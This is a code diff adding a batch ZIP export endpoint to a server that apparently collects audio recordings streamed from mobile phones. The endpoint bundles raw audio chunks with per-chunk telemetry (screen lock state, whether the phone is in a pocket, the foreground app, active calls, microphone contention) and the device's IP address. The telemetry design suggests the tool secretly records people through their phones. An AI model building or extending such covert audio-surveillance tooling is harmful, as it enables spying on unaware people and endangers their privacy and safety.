@@ -255,6 +255,329 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
 });
 
 // ════════════════════════════════════════════════════════════════════════════
+// BATCH MULTI-SESSION ZIP EXPORT (Pro Download with Chunks & Full Telemetry)
+// ════════════════════════════════════════════════════════════════════════════
+
+interface DecodedTelemetry {
+    sequenceNum: number;
+    filename: string;
+    fileSize: number;
+    durationMs: number;
+    batteryPercent: number | null;
+    powerSource: string;
+    screenState: string;
+    screenUnlocked: boolean | null;
+    audioRoute: string;
+    ringerMode: string;
+    speechDetected: boolean;
+    decibels: number | null;
+    temperatureC: number | null;
+    motion: string;
+    posture: string;
+    activeApp: string;
+    inCall: boolean;
+    micInUse: boolean;
+    receivedAtIST: string;
+    receivedAtUTC: string;
+}
+
+function toISTString(isoDate: string): string {
+    try {
+        const d = new Date(isoDate);
+        return d.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: false });
+    } catch {
+        return isoDate;
+    }
+}
+
+function parseChunkTelemetry(filename: string, chunk: db.Chunk): DecodedTelemetry {
+    const metaMatch = filename.match(/_B(-?\d+)_S(-?\d+)(?:_O([A-Z]{3}))?(?:_D([01]))?(?:_U([01]))?(?:_C([A-Z0-9]+))?(?:_R([A-Z0-9]+))?(?:_V([01]))?(?:_dB(\d+))?(?:_T(\d+))?(?:_M([01]))?(?:_P([A-Z]+))?(?:_A([A-Z0-9]+))?/);
+
+    let batteryPercent: number | null = null;
+    let powerSource = 'Battery (Unplugged)';
+    let screenState = 'Unknown';
+    let screenUnlocked: boolean | null = null;
+    let audioRoute = 'Internal Mic';
+    let ringerMode = 'Normal';
+    let speechDetected = false;
+    let decibels: number | null = null;
+    let temperatureC: number | null = null;
+    let motion = 'Still';
+    let posture = 'Normal';
+    let activeApp = 'None';
+
+    if (metaMatch) {
+        if (metaMatch[1] && metaMatch[1] !== '-1') {
+            batteryPercent = parseInt(metaMatch[1], 10);
+        }
+        const routeCode = metaMatch[3];
+        if (routeCode === 'JCK') audioRoute = 'Headphone Jack';
+        else if (routeCode === 'BLU') audioRoute = 'Bluetooth Audio';
+        else if (routeCode === 'SPK') audioRoute = 'Speakerphone';
+
+        const screenCode = metaMatch[4];
+        const unlockCode = metaMatch[5];
+        if (screenCode === '1') {
+            screenState = unlockCode === '1' ? 'Screen ON (Unlocked)' : 'Screen ON (Locked)';
+            screenUnlocked = unlockCode === '1';
+        } else if (screenCode === '0') {
+            screenState = 'Screen OFF';
+            screenUnlocked = false;
+        }
+
+        const powerCode = metaMatch[6];
+        if (powerCode === 'CAC') powerSource = 'Wall AC Fast Charger';
+        else if (powerCode === 'CUSB') powerSource = 'PC / USB Cable';
+        else if (powerCode === 'CWIR') powerSource = 'Wireless Charging';
+        else if (powerCode === 'CBAT') powerSource = 'Battery (Unplugged)';
+
+        const ringerCode = metaMatch[7];
+        if (ringerCode === 'RS') ringerMode = 'Silent';
+        else if (ringerCode === 'RV') ringerMode = 'Vibrate';
+        else if (ringerCode === 'RN') ringerMode = 'Normal';
+
+        speechDetected = metaMatch[8] === '1';
+        if (metaMatch[9]) decibels = parseInt(metaMatch[9], 10);
+        if (metaMatch[10] && parseInt(metaMatch[10], 10) > 0) temperatureC = parseInt(metaMatch[10], 10);
+
+        const motionCode = metaMatch[11];
+        if (motionCode === '1') motion = 'Moving';
+        else if (motionCode === '0') motion = 'Still';
+
+        const postureCode = metaMatch[12];
+        if (postureCode === 'POCK') posture = 'In Pocket';
+        else if (postureCode === 'DESK') posture = 'On Desk (Flat)';
+        else if (postureCode === 'OPEN' || postureCode === 'POPEN') posture = 'In Hand';
+        else if (postureCode === 'FACE') posture = 'Face Down';
+
+        if (metaMatch[13]) activeApp = metaMatch[13];
+    }
+
+    return {
+        sequenceNum: chunk.sequence_num,
+        filename: path.basename(chunk.filepath || filename),
+        fileSize: chunk.file_size,
+        durationMs: chunk.duration_ms,
+        batteryPercent,
+        powerSource,
+        screenState,
+        screenUnlocked,
+        audioRoute,
+        ringerMode,
+        speechDetected,
+        decibels,
+        temperatureC,
+        motion,
+        posture,
+        activeApp,
+        inCall: chunk.in_call === 1,
+        micInUse: chunk.mic_in_use === 1,
+        receivedAtIST: toISTString(chunk.received_at),
+        receivedAtUTC: chunk.received_at,
+    };
+}
+
+router.all('/batch-export-zip', exportRateLimit, async (req: Request, res: Response) => {
+    try {
+        let sessionIds: string[] = [];
+        if (Array.isArray(req.body?.session_ids)) {
+            sessionIds = req.body.session_ids.map((id: any) => String(id).trim()).filter(Boolean);
+        } else if (typeof req.body?.session_ids === 'string') {
+            sessionIds = req.body.session_ids.split(',').map((s: string) => s.trim()).filter(Boolean);
+        } else if (req.query?.session_ids || req.query?.ids) {
+            const raw = (req.query.session_ids || req.query.ids) as string;
+            sessionIds = raw.split(',').map(s => s.trim()).filter(Boolean);
+        }
+
+        if (sessionIds.length === 0) {
+            res.status(400).json({ status: 'error', message: 'No session_ids provided for batch export' });
+            return;
+        }
+
+        const formatParam = (req.body?.format || req.query?.format || 'pro_chunks').toLowerCase();
+        const timestampStr = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
+        const zipFilename = `audio_sessions_batch_${timestampStr}.zip`;
+
+        res.setHeader('Content-Type', 'application/zip');
+        res.setHeader('Content-Disposition', `attachment; filename="${zipFilename}"`);
+
+        const archive = archiver('zip', {
+            zlib: { level: 6 },
+        });
+
+        archive.on('error', (err: any) => {
+            console.error('[broadcast] Batch ZIP export error:', err);
+            if (!res.headersSent) {
+                res.status(500).json({ status: 'error', message: 'Batch export failed' });
+            }
+        });
+
+        archive.pipe(res);
+
+        for (const sessionId of sessionIds) {
+            const session = db.getSession(sessionId);
+            if (!session) {
+                archive.append(`Session ID: ${sessionId} not found in database.\n`, {
+                    name: `missing_sessions/${sessionId}.txt`
+                });
+                continue;
+            }
+
+            const cleanClient = (session.client_name || 'session').replace(/[^a-zA-Z0-9_-]/g, '_');
+            const datePrefix = (session.created_at || '').slice(0, 10).replace(/-/g, '');
+            const folderName = `${cleanClient}_${datePrefix}_${sessionId.slice(0, 8)}`;
+
+            const chunks = db.getSessionChunks(sessionId);
+            const rawDir = storage.getRawDir(sessionId);
+            const resolvedRawDir = path.resolve(rawDir);
+
+            // Decode telemetry for every chunk
+            const telemetryList: DecodedTelemetry[] = chunks.map(c => parseChunkTelemetry(c.filename, c));
+
+            // Compute summary statistics
+            const batteries = telemetryList.map(t => t.batteryPercent).filter((b): b is number => b !== null);
+            const startBattery = batteries.length > 0 ? `${batteries[0]}%` : 'Unknown';
+            const endBattery = batteries.length > 0 ? `${batteries[batteries.length - 1]}%` : 'Unknown';
+            const avgBattery = batteries.length > 0 ? `${Math.round(batteries.reduce((a, b) => a + b, 0) / batteries.length)}%` : 'Unknown';
+            const dBs = telemetryList.map(t => t.decibels).filter((d): d is number => d !== null);
+            const avgDecibels = dBs.length > 0 ? `${Math.round(dBs.reduce((a, b) => a + b, 0) / dBs.length)} dB` : 'N/A';
+            const temps = telemetryList.map(t => t.temperatureC).filter((t): t is number => t !== null);
+            const tempRange = temps.length > 0 ? `${Math.min(...temps)}°C - ${Math.max(...temps)}°C` : 'N/A';
+            const powerSources = [...new Set(telemetryList.map(t => t.powerSource))].join(', ') || 'Battery';
+            const callsCount = telemetryList.filter(t => t.inCall).length;
+            const micInUseCount = telemetryList.filter(t => t.micInUse).length;
+
+            // Retrieve device installation record if available
+            const installs = db.getDeviceInstalls(100);
+            const installInfo = installs.find(i => i.client_id === session.client_name);
+
+            // 1. Generate human-readable SESSION_REPORT.txt
+            const reportText = `================================================================================
+📡 AUDIO STREAM PRO RECORDING & TELEMETRY REPORT
+================================================================================
+Session ID       : ${session.session_id}
+Device Name      : ${session.client_name || 'Unknown Device'}
+Device Info      : ${session.device_info || 'Mobile Audio Client'}
+Stream Type      : ${session.stream_type.toUpperCase()}
+Created (IST)    : ${toISTString(session.created_at)}
+Ended (IST)      : ${session.ended_at ? toISTString(session.ended_at) : 'Active / Still Open'}
+Total Duration   : ${Math.floor(session.total_duration / 60)}m ${Math.floor(session.total_duration % 60)}s (${session.total_duration.toFixed(1)}s)
+Total Chunks     : ${chunks.length}
+Total Audio Size : ${(session.total_bytes / (1024 * 1024)).toFixed(2)} MB (${session.total_bytes.toLocaleString()} bytes)
+
+--------------------------------------------------------------------------------
+📱 DEVICE SPECIFICATIONS (From Registration)
+--------------------------------------------------------------------------------
+Model            : ${installInfo?.device_model || session.device_info || 'Unknown'}
+Manufacturer     : ${installInfo?.manufacturer || 'Unknown'}
+Android / OS     : ${installInfo?.os_version || 'Unknown'}
+App Version      : ${installInfo?.app_version || 'Latest'}
+IP Address       : ${installInfo?.ip_address || 'Local / Cellular'}
+Registration Date: ${installInfo?.installed_at ? toISTString(installInfo.installed_at) : 'N/A'}
+
+--------------------------------------------------------------------------------
+🔋 BATTERY & HARDWARE SENSORS SUMMARY
+--------------------------------------------------------------------------------
+Start Battery    : ${startBattery}
+End Battery      : ${endBattery}
+Average Battery  : ${avgBattery}
+Power States     : ${powerSources}
+Call Detections  : ${callsCount > 0 ? `Active Call during ${callsCount} chunks` : 'No Phone Calls Detected'}
+Mic Interference : ${micInUseCount > 0 ? `Microphone contested during ${micInUseCount} chunks` : 'Clear exclusive recording'}
+Average Decibels : ${avgDecibels}
+Temperature      : ${tempRange}
+
+================================================================================
+Exported with Audio Stream Pro Downloader on ${toISTString(new Date().toISOString())}
+================================================================================
+`;
+            archive.append(reportText, { name: `${folderName}/SESSION_REPORT.txt` });
+
+            // 2. Generate granular telemetry_timeline.csv
+            const csvRows = [
+                'Sequence,Filename,Duration_Ms,Timestamp_IST,Timestamp_UTC,Battery_Pct,Power_Source,In_Call,Mic_In_Use,Speech_Detected,Decibels_dB,Temp_C,Screen_State,Motion,Posture,Active_App'
+            ];
+            for (const t of telemetryList) {
+                csvRows.push([
+                    t.sequenceNum,
+                    `"${t.filename}"`,
+                    t.durationMs,
+                    `"${t.receivedAtIST}"`,
+                    `"${t.receivedAtUTC}"`,
+                    t.batteryPercent !== null ? t.batteryPercent : '',
+                    `"${t.powerSource}"`,
+                    t.inCall ? '1' : '0',
+                    t.micInUse ? '1' : '0',
+                    t.speechDetected ? '1' : '0',
+                    t.decibels !== null ? t.decibels : '',
+                    t.temperatureC !== null ? t.temperatureC : '',
+                    `"${t.screenState}"`,
+                    `"${t.motion}"`,
+                    `"${t.posture}"`,
+                    `"${t.activeApp}"`
+                ].join(','));
+            }
+            archive.append(csvRows.join('\r\n'), { name: `${folderName}/telemetry_timeline.csv` });
+
+            // 3. Generate structured metadata.json
+            const metadataObj = {
+                session,
+                install: installInfo || null,
+                telemetry_summary: {
+                    start_battery: startBattery,
+                    end_battery: endBattery,
+                    avg_battery: avgBattery,
+                    power_sources: powerSources,
+                    calls_count: callsCount,
+                    mic_in_use_count: micInUseCount,
+                    avg_decibels: avgDecibels,
+                    temperature_range: tempRange
+                },
+                chunks: telemetryList
+            };
+            archive.append(JSON.stringify(metadataObj, null, 2), { name: `${folderName}/metadata.json` });
+
+            // 4. Append Audio Chunks or Merged Audio
+            const chunkFiles = chunks
+                .map(c => path.resolve(c.filepath))
+                .filter(filePath =>
+                    (filePath === resolvedRawDir || filePath.startsWith(`${resolvedRawDir}${path.sep}`))
+                    && fs.existsSync(filePath)
+                );
+
+            if (formatParam === 'audio') {
+                // Merge all raw chunks into single continuous stream/file
+                if (chunkFiles.length > 0) {
+                    const buffers: Buffer[] = [];
+                    for (const fp of chunkFiles) {
+                        try {
+                            buffers.push(fs.readFileSync(fp));
+                        } catch { }
+                    }
+                    if (buffers.length > 0) {
+                        const mergedBuffer = Buffer.concat(buffers);
+                        const ext = path.extname(chunkFiles[0]) || '.aac';
+                        archive.append(mergedBuffer, { name: `${folderName}/${cleanClient}_full_audio${ext}` });
+                    }
+                }
+            } else {
+                // Pro chunks mode: include every individual raw chunk
+                for (const filePath of chunkFiles) {
+                    archive.file(filePath, { name: `${folderName}/chunks/${path.basename(filePath)}` });
+                }
+            }
+        }
+
+        await archive.finalize();
+    } catch (err: any) {
+        console.error('[broadcast] Batch export error:', err);
+        if (!res.headersSent) {
+            res.status(500).json({ status: 'error', message: err.message });
+        }
+    }
+});
+
+// ════════════════════════════════════════════════════════════════════════════
 // EXPORT AUDIO BY CHANNEL (Mic vs Internal vs Stereo)
 // ════════════════════════════════════════════════════════════════════════════
 
